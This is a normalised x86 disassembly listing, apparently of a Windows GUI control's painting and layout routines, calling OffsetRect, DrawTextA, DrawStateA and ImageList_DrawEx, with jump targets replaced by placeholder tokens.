pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x18c ]
sub_47ed24
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x16c ] 0x0
je r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_480644
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov al [ ebx + 0x171 ]
mov edx eax
sub dl 0x2
jb r-xdata
test al al
jne r-xdata
sub dl 0x2
jb r-xdata
mov edx edi
sar edx 0x1
jns r-xdata
mov edx edi
sar edx 0x1
jns r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x4 ]
sar eax 0x1
jns r-xdata
adc edx 0x0
mov eax [ esp + 0x4 ]
sar eax 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebx + 0x17e ]
push eax
mov eax ebx
call sub_47ec64
sar eax 0x1
jns r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
sub edx eax
lea ecx [ esp + 0x8 ]
mov eax esi
sub eax [ ebx + 0x182 ]
sub eax [ esp ]
call sub_417088
mov eax [ esp + 0x8 ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x176 ] eax
mov eax ebx
call sub_47ecac
sar eax 0x1
jns r-xdata
adc eax 0x0
sub edx eax
lea ecx [ esp + 0x8 ]
mov eax [ ebx + 0x17a ]
call sub_417088
mov eax [ esp + 0x8 ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x176 ] eax
mov eax ebx
call sub_47ecac
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edi esi
sar edi 0x1
jns r-xdata
adc eax 0x0
mov edx edi
sar edx 0x1
jns r-xdata
mov eax esi
sar eax 0x1
jns r-xdata
sar edi 0x1
jns r-xdata
adc eax 0x0
sar edi 0x1
jns r-xdata
adc eax 0x0
mov edx edi
sub edx eax
push edx
lea eax [ ebx + 0x190 ]
push eax
call OffsetRect
mov edx esp
mov eax ebx
call sub_47ecf4
mov ebp eax
mov eax ebx
call sub_47ecac
add eax [ ebx + 0x194 ]
add ebp eax
mov edx ebp
mov eax edi
mov ecx [ esp ]
sar ecx 0x1
jns r-xdata
adc edi 0x0
mov eax [ esp + 0x4 ]
sar eax 0x1
jns r-xdata
adc edx 0x0
mov edx [ esp ]
sar edx 0x1
jns r-xdata
adc eax 0x0
sub edi eax
push edi
mov eax [ ebx + 0x17a ]
push eax
lea eax [ ebx + 0x190 ]
push eax
call OffsetRect
jmp r-xdata
adc edi 0x0
sub edi eax
push edi
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_47ecf4
mov edx [ ebx + 0x17a ]
add edx [ esp + 0x4 ]
add eax edx
push eax
lea eax [ ebx + 0x190 ]
push eax
call OffsetRect
jmp r-xdata
adc edi 0x0
sub eax ecx
lea ecx [ esp + 0x8 ]
call sub_417088
mov eax [ esp + 0x8 ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x176 ] eax
adc ecx 0x0
sub edx eax
mov eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
sub eax edx
lea ecx [ esp + 0x8 ]
mov edx [ ebx + 0x17e ]
call sub_417088
mov eax [ esp + 0x8 ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x176 ] eax
jmp r-xdata
adc edx 0x0
mov ecx [ esp ]
sar ecx 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x176 ]
add eax [ esp + 0x4 ]
add eax [ ebx + 0x18c ]
push eax
mov eax ebx
call sub_47ec64
sar eax 0x1
jns r-xdata
sub eax ecx
lea ecx [ esp + 0x8 ]
call sub_417088
mov eax [ esp + 0x8 ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x176 ] eax
adc ecx 0x0
sar esi 0x1
jns r-xdata
adc eax 0x0
sub esi eax
push esi
lea eax [ ebx + 0x190 ]
push eax
call OffsetRect
jmp r-xdata
adc esi 0x0
sub_47efd8
push ebx
mov ebx eax
mov eax [ ebx + 0x16c ]
test eax eax
je r-xdata
pop ebx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax ebx
call sub_480118
mov eax [ ebx + 0x16c ]
mov eax [ eax + 0x38 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_47f02c
push ebx
push esi
mov ebx eax
xor eax eax
mov ecx [ edx ]
cmp ecx 0x204
jge r-xdata
add ecx 0xfffffdfc
sub ecx 0x2
jb r-xdata
sub ecx 0x7b
je r-xdata
mov edx [ ebx + 0x16c ]
test edx edx
je r-xdata
add ecx 0xffff51f3
sub ecx 0x2
jb r-xdata
add ecx 0xfffffe7b
sub ecx 0x3
jb r-xdata
pop esi
pop ebx
retn
cmp [ edx + 0x1c ] 0x0
je r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov al 0x1
pop esi
pop ebx
retn
sub ecx 0x1a
je r-xdata
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
jmp r-xdata
mov al 0x1
mov eax esi
call sub_47b0a8
test eax eax
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47b0a8
mov edx eax
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_47f0c0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_48060c
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x160 ]
call sub_424e6c
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov eax ebx
call sub_48060c
mov eax [ eax + 0x210 ]
call sub_479c94
test al al
je r-xdata
call sub_43c760
call sub_43c840
test al al
je r-xdata
mov eax ebx
call sub_48060c
mov eax [ eax + 0x210 ]
call sub_479c94
test al al
je r-xdata
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a30
mov edi eax
mov eax ebx
call sub_48060c
call sub_47ea90
cmp edi [ eax + 0x40 ]
jne r-xdata
mov eax ebx
call sub_48060c
mov eax [ eax + 0x210 ]
mov al [ eax + 0x14 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esp
mov eax ebx
call sub_44894c
push 0x0
push 0x0
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
mov eax ebx
call sub_48060c
call sub_44f7d8
push eax
call sub_43c760
pop edx
pop ecx
call sub_43c9d8
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
xor edx edx
call sub_424428
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_47f1d0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4804d0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_479c90
call sub_479044
mov esi [ eax + 0x38 ]
mov eax [ ebx + 0x16c ]
call sub_47b0a8
mov eax [ eax + 0x5c ]
mov esi [ eax + 0x38 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x16c ]
cmp [ eax + 0x58 ] 0xffffffff
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx [ edi + 0x4 ]
push edx
mov edx [ ebx + 0x16c ]
mov edx [ edx + 0x58 ]
push edx
push 0x3
push 0x0
push eax
mov ecx [ edi ]
mov edx [ ebx + 0x160 ]
mov eax esi
call sub_45717c
sub_47f260
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_4804d0
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_479c90
call sub_479044
mov esi [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx 0x20
mov eax 0x20
call sub_417088
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_47f58d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47f570
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_4299e0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424a38
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_4299e0
lea edx [ ebp - 0x28 ]
call sub_42525c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4299e0
pop edx
call sub_424e6c
mov eax [ ebp - 0x10 ]
call sub_4299e0
lea edx [ ebp - 0x28 ]
call sub_42525c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_4170c4
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4299e0
mov ecx [ ebx + 0x160 ]
pop edx
call sub_424d38
jmp r-xdata
mov eax [ ebx + 0x16c ]
call sub_479bd4
call sub_479c94
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_4299e0
call sub_425280
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x80 ]
push eax
mov eax esi
call sub_4568b4
push eax
call ImageList_DrawEx
mov esi [ ebp - 0x18 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edi [ ebp - 0x14 ]
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push edi
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
xor edx edx
xor eax eax
call sub_4170c4
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4299e0
mov ecx [ ebp - 0x10 ]
pop edx
call sub_42503c
mov edx 0xffffff
mov eax [ ebp - 0xc ]
call sub_42ab58
mov dl 0x1
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx edi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a30
push eax
mov eax [ ebp - 0x10 ]
call sub_4299e0
mov eax [ eax + 0x14 ]
pop edx
call sub_424a38
mov eax [ ebp - 0x10 ]
call sub_4299e0
lea edx [ ebp - 0x28 ]
call sub_42525c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4299e0
pop edx
call sub_424e6c
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4299e0
xor ecx ecx
xor edx edx
call sub_424dc0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov edi [ ebp - 0x4 ]
mov eax edi
add eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov esi [ ebp - 0x8 ]
mov ecx esi
add ecx [ ebp - 0x18 ]
mov edx edi
mov eax esi
call sub_4170c4
lea edx [ ebp - 0x28 ]
mov eax [ ebx + 0x160 ]
mov ecx [ ebp - 0x10 ]
call sub_42503c
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov eax edi
add eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov esi [ ebp - 0x8 ]
mov ecx esi
add ecx [ ebp - 0x18 ]
mov edx edi
mov eax esi
call sub_4170c4
lea edx [ ebp - 0x28 ]
mov eax [ ebx + 0x160 ]
mov ecx [ ebp - 0xc ]
call sub_42503c
jmp r-xdata
push 0x24
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push 0x0
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a6c
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawStateA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f577
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_47f59c
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_48060c
test eax eax
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_48060c
mov al [ eax + 0x227 ]
sub al 0x2
jae r-xdata
mov eax ebx
call sub_4489f4
mov edx eax
sar edx 0x1
jns r-xdata
mov eax ebx
call sub_4489b0
sar eax 0x1
jns r-xdata
mov ecx esp
mov eax esi
call sub_417088
mov eax ebx
call sub_4489f4
mov edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov ecx esp
mov edx esi
dec edx
call sub_417088
mov eax ebx
call sub_4489f4
sub eax esi
inc eax
push eax
mov eax ebx
call sub_4489b0
sar eax 0x1
jns r-xdata
adc eax 0x0
lea ecx [ esp + 0x8 ]
mov eax [ ebx + 0x48 ]
sub eax esi
call sub_417088
adc edx 0x0
lea ecx [ esp + 0xc ]
pop edx
call sub_417088
jmp r-xdata
adc eax 0x0
mov edi [ ebx + 0x16c ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov esi [ ebx + 0x160 ]
mov edx 0x1
mov eax [ esi + 0x10 ]
call sub_424864
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov edi [ ebx + 0x70 ]
cmp edi 0xff00000f
jne r-xdata
mov eax edi
call sub_47b8c0
test al al
je r-xdata
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x10 ]
mov eax esi
call sub_424e6c
mov edx 0xffffffce
mov eax edi
call sub_46b1b8
mov edx eax
mov eax [ esi + 0x10 ]
call sub_424758
mov edx 0xff000010
mov eax [ esi + 0x10 ]
call sub_424758
jmp r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov eax [ eax + 0x6c ]
mov edx 0xffffffce
call sub_46b1b8
mov edx eax
mov eax [ esi + 0x10 ]
call sub_424758
jmp r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax edi
call sub_47b8c0
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax esi
call sub_424f44
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax esi
call sub_424ee4
mov edi [ ebx + 0x16c ]
test edi edi
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x6c ]
mov eax [ esi + 0x10 ]
call sub_424758
mov edx 0xff000014
mov eax [ esi + 0x10 ]
call sub_424758
jmp r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov ecx [ esp + 0x4 ]
inc ecx
mov edx eax
mov eax esi
call sub_424f44
mov ecx [ esp + 0xc ]
inc ecx
mov edx ebx
mov eax esi
call sub_424ee4
mov ebx eax
inc ebx
mov edx ebx
mov ecx [ esp + 0x4 ]
mov eax esi
call sub_424f44
mov edx ebx
mov ecx [ esp + 0xc ]
mov eax esi
call sub_424ee4
jmp r-xdata
mov ebx [ esp + 0x8 ]
mov eax [ esp ]
cmp ebx eax
jne r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov eax [ eax + 0x6c ]
mov edx 0x13
call sub_46b0f8
mov edx eax
mov eax [ esi + 0x10 ]
call sub_424758
jmp r-xdata
mov edx 0xff000014
mov eax [ esi + 0x10 ]
call sub_424758
jmp r-xdata
sub_47f7c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_404368
xor eax eax
push ebp
push sub_47f827
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi ]
push eax
push esi
mov eax [ ebp + 0x8 ]
call sub_404178
push eax
mov eax [ ebp + 0x8 ]
call sub_404378
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f82e
lea eax [ ebp + 0x8 ]
call sub_403eb8
retn
sub_47f838
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
mov eax [ ebp + 0x10 ]
call sub_404368
xor eax eax
push ebp
push sub_47f900
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_42426c
push esi
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
call sub_404178
push eax
mov eax [ ebp + 0x10 ]
call sub_404378
mov edi eax
push edi
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0xc ]
call sub_42426c
push esi
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
call sub_404178
push eax
push edi
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f907
lea eax [ ebp + 0x10 ]
call sub_403eb8
retn
sub_47f910
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
mov al 0x1
pop ebx
retn
sub_47f940
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47fcdf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x1a0 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x1a0 ]
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424b54
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
test eax eax
je r-xdata
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424b54
mov al 0x1
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
cmp [ eax + 0x24 ] 0x20000000
je r-xdata
mov eax ebx
call sub_48060c
call sub_47d448
test al al
je r-xdata
mov edx 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
mov edx [ eax + 0x24 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
jne r-xdata
mov eax ebx
call sub_48060c
call sub_47d41c
cmp [ eax + 0x29 ] 0x0
je r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xac ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_44b2c4
or eax 0x100
mov [ ebp - 0x4 ] eax
lea esi [ ebx + 0x190 ]
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424b54
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x50 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_42426c
call sub_43c760
call sub_43c840
test al al
je r-xdata
mov eax ebx
call sub_4804d0
test al al
jne r-xdata
lea edx [ ebx + 0x172 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xa8 ]
lea edx [ ebx + 0x172 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xa4 ]
jmp r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov eax ebx
call sub_48060c
test eax eax
je r-xdata
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fce6
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403edc
retn
mov eax ebx
call sub_480364
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x1
push 0x1
lea eax [ ebp - 0x14 ]
push eax
call OffsetRect
dec [ ebp - 0xc ]
dec [ ebp - 0x8 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424b54
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x70 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
mov edx 0x2
call sub_424864
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4540d8
test al al
jne r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xb0 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xa0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_42426c
cmp [ ebx + 0x18a ] 0x0
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x2c ]
push eax
mov eax ebx
call sub_48060c
call sub_47ea90
mov eax [ eax + 0x48 ]
push eax
mov eax ebx
call sub_48060c
call sub_47ea90
mov eax [ eax + 0x4c ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xb4 ]
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_42426c
sub_47fcfc
push esi
mov esi eax
cmp dl [ esi + 0x1a0 ]
je r-xdata
pop esi
retn
mov [ esi + 0x1a0 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_47fd38
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
xor edx edx
xor eax eax
call sub_417088
mov eax ebx
call sub_4804d0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x16c ]
cmp [ eax + 0x61 ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47b09c
cmp [ eax + 0x29 ] 0x0
je r-xdata
mov ecx esi
mov edx 0x20
mov eax 0x20
call sub_417088
mov eax [ ebx + 0x16c ]
call sub_47b0a8
test eax eax
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_479c90
call sub_479044
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47b0a8
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_479c90
call sub_479044
mov ebx [ eax + 0x38 ]
mov ecx esi
mov edx [ ebx + 0x30 ]
mov eax [ ebx + 0x34 ]
call sub_417088
jmp r-xdata
mov eax [ ebx + 0x16c ]
call sub_47b0a8
mov eax [ eax + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47b0a8
mov eax [ eax + 0x5c ]
mov ebx [ eax + 0x38 ]
mov ecx esi
mov edx [ ebx + 0x30 ]
mov eax [ ebx + 0x34 ]
call sub_417088
jmp r-xdata
sub_47fe20
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47fefa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x16c ]
cmp esi eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ff01
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
test eax eax
je r-xdata
mov [ ebx + 0x16c ] esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
call sub_479dfc
test esi esi
je r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ ebx + 0x16c ]
mov eax [ eax + 0x24 ]
mov edx eax
sub edx 0x1fffffff
je r-xdata
mov [ ebx + 0x1a0 ] 0x1
mov dl 0x1
mov eax ebx
call sub_449170
jmp r-xdata
dec edx
je r-xdata
mov dl [ esi + 0x30 ]
mov eax ebx
call sub_448ecc
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x16c ]
call sub_47b0b8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fdc
mov dl 0x1
mov eax ebx
call sub_449170
jmp r-xdata
jmp r-xdata
cmp eax 0x20000000
jne r-xdata
mov edx eax
mov eax ebx
call sub_44914c
mov dl 0x1
mov eax ebx
call sub_449170
jmp r-xdata
sub_47ff0c
push esi
mov esi eax
cmp dl [ esi + 0x18a ]
je r-xdata
pop esi
retn
mov [ esi + 0x18a ] dl
test dl dl
je r-xdata
mov eax esi
mov edx [ eax ]
